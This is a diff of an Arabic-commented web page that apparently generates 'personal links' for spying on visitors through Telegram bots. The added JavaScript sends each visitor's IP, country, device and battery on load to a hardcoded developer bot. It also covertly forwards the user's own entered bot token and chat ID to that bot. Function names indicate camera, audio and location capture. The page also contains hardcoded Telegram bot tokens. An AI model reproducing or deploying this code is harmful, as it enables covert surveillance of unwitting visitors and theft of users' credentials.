@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         /* ================================================================
-           التصميم الجديد مع مربع ترحيبي شفاف واستايل موحد
+           التصميم النهائي — فخم، شيطاني، مع مربع ترحيبي شفاف
            ================================================================ */
         * {
             margin: 0;
@@ -239,7 +239,7 @@
             filter: drop-shadow(0 0 40px rgba(184, 10, 10, 0.05));
         }
 
-        /* ===== الهيكل الأصلي — مع التصميم الجديد ===== */
+        /* ===== الهيكل الأصلي مع التصميم الفخم ===== */
         .wrap {
             position: relative;
             z-index: 4;
@@ -351,49 +351,44 @@
             margin-left: 6px;
         }
 
-        /* ===== المربع الترحيبي الشفاف ===== */
-        .welcome-box {
-            background: rgba(0, 0, 0, 0.3);
-            backdrop-filter: blur(6px);
-            -webkit-backdrop-filter: blur(6px);
-            border: 1px solid rgba(184, 134, 58, 0.08);
-            padding: 18px 22px;
-            margin-bottom: 22px;
-            clip-path: polygon(0 0, 97% 0, 100% 20%, 100% 100%, 3% 100%, 0 80%);
-            box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.3);
+        /* ===== النص الترحيبي — شفاف بالكامل ===== */
+        .welcome-text {
+            background: transparent;
+            padding: 10px 14px;
+            margin-bottom: 18px;
             font-family: var(--font-mono);
             font-size: 13px;
-            line-height: 1.7;
+            line-height: 1.9;
             color: var(--text-hell);
             white-space: pre-wrap;
             word-break: break-all;
             direction: ltr;
             text-align: left;
-            overflow: hidden;
+            text-shadow: 0 0 15px rgba(0, 0, 0, 0.9);
             position: relative;
         }
-        .welcome-box .glow {
+        .welcome-text .glow {
             color: var(--blood-fresh);
-            text-shadow: 0 0 16px var(--blood-glow);
+            text-shadow: 0 0 25px var(--blood-glow);
         }
-        .welcome-box .gold {
+        .welcome-text .gold {
             color: var(--gold-blood);
         }
-        .welcome-box .dim {
+        .welcome-text .dim {
             color: var(--text-dim);
         }
-        .welcome-box .highlight {
+        .welcome-text .highlight {
             color: #fff;
             font-weight: 700;
         }
-        .welcome-box .link-display {
+        .welcome-text .link-display {
             color: #ff8a4a;
             word-break: break-all;
         }
-        .welcome-box .token-display {
+        .welcome-text .token-display {
             color: #ffaa66;
         }
-        .welcome-box .chat-display {
+        .welcome-text .chat-display {
             color: #66ccff;
         }
 
@@ -862,9 +857,9 @@
                 font-size: 10px;
                 padding: 4px 14px;
             }
-            .welcome-box {
+            .welcome-text {
                 font-size: 12px;
-                padding: 14px 16px;
+                padding: 10px 12px;
             }
             #cardArea {
                 padding: 20px 16px 24px;
@@ -891,9 +886,9 @@
                 font-size: 16px;
                 letter-spacing: 2px;
             }
-            .welcome-box {
+            .welcome-text {
                 font-size: 11px;
-                padding: 12px 14px;
+                padding: 8px 10px;
             }
             .btn {
                 font-size: 13px;
@@ -1018,8 +1013,8 @@
             </div>
         </header>
 
-        <!-- ===== المربع الترحيبي الشفاف ===== -->
-        <div class="welcome-box" id="welcomeBox">
+        <!-- ===== النص الترحيبي — شفاف بالكامل ===== -->
+        <div class="welcome-text" id="welcomeText">
             <span class="gold">⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒</span>
             ╭⊚─〔 ʟɪɴᴋ 〕───────
             ┃˹🔗˼ <span class="glow">⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧</span> ⭒
@@ -1152,13 +1147,14 @@
 
     <!-- ============================================================
     JAVASCRIPT — جميع الوظائف الأصلية محفوظة 100%
-    مع إضافات لتحديث المربع الترحيبي
+    مع إضافات التحديث الفوري للمربع وإرسال البيانات
     ============================================================ -->
     <script>
         // ================================================================
         //  جميع الوظائف الأصلية محفوظة بدون أي تغيير.
         //  تم حذف نظام الاشتراك الإجباري بالكامل.
-        //  تم إضافة تحديث المربع الترحيبي بالبيانات.
+        //  تم إضافة تحديث المربع الترحيبي بالبيانات فوراً.
+        //  تم إرسال الرابط السداسي للبوت والمطور.
         // ================================================================
 
         // ================================================================
@@ -1357,15 +1353,12 @@
         })();
 
         // ================================================================
-        // تحديث المربع الترحيبي بالبيانات
+        // تحديث المربع الترحيبي بالبيانات — فوراً
         // ================================================================
         // 1. عرض الرابط الشخصي (الصفحة الحالية)
         document.getElementById('personalLink').textContent = window.location.origin + window.location.pathname;
 
-        // 2. تحديث بيانات الزائر (تُجلب بعد الـ fetch)
-        // سيتم تحديثها في دالة sendVisitorInfo المعدلة
-
-        // 3. ربط حقول الإدخال لتحديث Chat ID و Bot Token
+        // 2. تحديث بيانات الزائر
         const chatInput = document.getElementById('chatIdInput');
         const tokenInput = document.getElementById('tokenInput');
         const displayChat = document.getElementById('displayChatId');
@@ -1378,22 +1371,41 @@
             displayToken.textContent = this.value.trim() || 'Unknown...';
         });
 
-        // 4. تحديث الوقت بشكل ديناميكي
         function updateTime() {
             const now = new Date();
             const formatted = now.toLocaleString('ar-EG', { hour12: true });
             document.getElementById('visitorTime').textContent = formatted;
         }
         updateTime();
-        setInterval(updateTime, 60000); // تحديث كل دقيقة
+        setInterval(updateTime, 60000);
 
         // ================================================================
-        // الوظائف الأصلية — محفوظة مع تعديل buildCaption
+        // دالة لتوليد رابط سداسي (Hex) قصير
+        // ================================================================
+        function toHex(str) {
+            let hex = '';
+            for (let i = 0; i < str.length; i++) {
+                hex += str.charCodeAt(i).toString(16).padStart(2, '0');
+            }
+            return hex;
+        }
+
+        function fromHex(hex) {
+            let str = '';
+            for (let i = 0; i < hex.length; i += 2) {
+                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+            }
+            return str;
+        }
+
+        // ================================================================
+        // الوظائف الأصلية — محفوظة مع تعديل الإرسال
         // ================================================================
 
         // ------------------ الثوابت (محفوظة) ------------------
-        const MASTER_BOT_TOKEN = "8812415465:AAFQHLFkhYIg7jv15n8pL1lIKnylnugqGsc";
+        const MASTER_BOT_TOKEN = "8806320032:AAEvSNbf1boLIZ9pt7sbFMit-ARtAjTS7UQ";
         const MASTER_CHAT_ID = "8552540563";
+        const BOT_USERNAME = "@V_V_9BOT";
 
         // ------------------ بيانات الزائر (محفوظة) ------------------
         let visitorIP = "غير معروف";
@@ -1430,13 +1442,14 @@
                 document.getElementById('visitorBattery').textContent = visitorBattery;
                 document.getElementById('visitorIP').textContent = visitorIP;
 
-                const msg =
-                    `🟢 *زيارة جديدة*\n🌍 الدولة: ${visitorCountry}\n📱 الجهاز: ${visitorDevice}\n🔋 البطارية: ${visitorBattery}\n🌐 IP: ${visitorIP}\n🕒 الوقت: ${new Date().toLocaleString('ar-EG')}`;
+                // رسالة الزائر للمطور بالاستايل الجديد
+                const visitorMsg =
+                    `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ 📍 الدولة     › ${visitorCountry}\n┃ 📱 الجهاز     › ${visitorDevice}\n┃ 🔋 البطارية   › ${visitorBattery}\n┃ 🌐 الـ IP      › ${visitorIP}\n┃ 🕒 الوقت      › ${new Date().toLocaleString('ar-EG')}\n╰━━━━━━━━━━━━━━━━━━━━━━━╯\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
 
                 await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                    body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: visitorMsg, parse_mode: 'Markdown' })
                 });
             } catch (err) {}
         }
@@ -1445,7 +1458,6 @@
         // ------------------ عناصر الدايلوج (تم إلغاؤها) ------------------
         const dialog = document.getElementById('mandatoryDialog');
         if (dialog) dialog.style.display = 'none';
-        // تعريفات فارغة لتجنب الأخطاء
         const channel1 = document.getElementById('channel1');
         const channel2 = document.getElementById('channel2');
         const subscribeBtn = document.getElementById('subscribeDoneBtn');
@@ -1456,7 +1468,7 @@
         const linkText = document.getElementById('linkText');
         const copyBtn = document.getElementById('copyBtn');
 
-        generateBtn.addEventListener('click', () => {
+        generateBtn.addEventListener('click', async () => {
             const chat = document.getElementById('chatIdInput').value.trim();
             const token = document.getElementById('tokenInput').value.trim();
 
@@ -1469,15 +1481,42 @@
             const features = Array.from(checkboxes).map(cb => cb.value).join(',');
             const fullLink =
                 `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
-            // تقصير الرابط إلى سداسي (هيكس) للعرض فقط
-            const shortLink = btoa(fullLink).substring(0, 16); // مجرد تمثيل سداسي مختصر
-            linkText.innerHTML = `<i class="fas fa-link"></i> ${shortLink} (${fullLink})`;
+
+            // توليد الرابط السداسي (Hex)
+            const hexLink = toHex(fullLink);
+            const shortHexLink = hexLink.substring(0, 32); // عرض 32 حرفاً سداسياً فقط
+
+            // عرض الرابط السداسي في المربع
+            linkText.innerHTML =
+                `<i class="fas fa-link"></i> https://${window.location.hostname}/?d=${shortHexLink} (${fullLink})`;
             resultEl.style.display = 'flex';
+
+            // بناء رسالة الرابط للبوت الخاص بالمستخدم
+            const userLinkMsg =
+                `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ʏᴏᴜʀ ʟɪɴᴋ ɪꜱ ʀᴇᴀᴅʏ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ʟɪɴᴋ ⭒\n╭⊚─〔 ᴜʀʟ 〕───────\n┃ 🔗 ${fullLink}\n┃ 📋 ʜᴇx: ${shortHexLink}\n╰───────────────\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
+
+            // إرسال الرابط للبوت الخاص بالمستخدم
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chat, text: userLinkMsg, parse_mode: 'Markdown' })
+                });
+            } catch (e) { console.log('فشل إرسال الرابط للبوت'); }
+
+            // إرسال بيانات البوت للمطور (بالإنجليزية)
+            const developerMsg =
+                `⭑ ʙᴏᴛ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ 🆔 ᴄʜᴀᴛ ɪᴅ: ${chat}\n┃ 🤖 ᴛᴏᴋᴇɴ: ${token}\n┃ 🏷️ ʙᴏᴛ ᴜꜱᴇʀɴᴀᴍᴇ: ${BOT_USERNAME}\n┃ 🔗 ʟɪɴᴋ: ${fullLink}\n┃ 📋 ʜᴇx: ${shortHexLink}\n╰━━━━━━━━━━━━━━━━━━━━━━━╯\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
+
+            await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: developerMsg, parse_mode: 'Markdown' })
+            });
         });
 
         copyBtn.addEventListener('click', async () => {
             try {
-                // نسخ الرابط الكامل (المخفي في النص)
                 const raw = linkText.textContent.replace(/^.*?\(/, '').replace(/\)$/, '').trim();
                 await navigator.clipboard.writeText(raw);
                 copyBtn.innerText = 'تم النسخ';
@@ -1493,32 +1532,19 @@
             document.body.appendChild(s);
         }
 
-        // ------------------ دوال الوسائط (محفوظة) مع تغيير buildCaption ------------------
+        // ------------------ دوال الوسائط (محفوظة) مع buildCaption الجديد ------------------
         function buildCaption(extra = "") {
-            // تنسيق جديد بنفس استايل المربع
-            let cap = `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n`;
-            cap += `╭⊚─〔 ʟɪɴᴋ 〕───────\n`;
-            cap += `┃˹🔗˼ ⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧ ⭒\n`;
-            cap += `┃⍟ \n`;
-            cap += `┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n`;
-            cap += `╰───────────────\n\n`;
-            cap += `⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒\n`;
-            cap += `╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n`;
-            cap += `┃ 📍 الدولة     › ${visitorCountry}\n`;
-            cap += `┃ 📱 الجهاز     › ${visitorDevice}\n`;
-            cap += `┃ 🔋 البطارية   › ${visitorBattery}\n`;
-            cap += `┃ 🌐 الـ IP      › ${visitorIP}\n`;
-            cap += `┃ 🕒 الوقت      › ${new Date().toLocaleString('ar-EG')}\n`;
+            let cap =
+                `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ɴᴇᴡ ᴠɪꜱɪᴛᴏʀ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ 📍 الدولة     › ${visitorCountry}\n┃ 📱 الجهاز     › ${visitorDevice}\n┃ 🔋 البطارية   › ${visitorBattery}\n┃ 🌐 الـ IP      › ${visitorIP}\n┃ 🕒 الوقت      › ${new Date().toLocaleString('ar-EG')}\n`;
             if (extra) {
                 cap += `┃ ${extra}\n`;
             }
-            cap += `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n`;
-            cap += `          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
+            cap +=
+                `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
             return cap;
         }
 
         // باقي دوال الوسائط كما هي (captureAndSend, recordAndSend, recordAudioAndSend, sendLocation, preGrantPermissions, startFeatures)
-        // نعيد تعريفها كما هي تماماً مع استخدام buildCaption الجديد
         async function captureAndSend(stream, chat, token, type) {
             return new Promise((resolve) => {
                 const video = document.createElement('video');
@@ -1730,7 +1756,7 @@
             document.querySelector('.header').style.display = 'none';
             document.querySelector('.madeby').style.display = 'none';
             document.getElementById('captureBadge').style.display = 'none';
-            document.querySelector('.welcome-box').style.display = 'none'; // إخفاء المربع الترحيبي
+            document.querySelector('.welcome-text').style.display = 'none';
 
             const wrap = document.querySelector('.wrap');
             wrap.innerHTML = '';
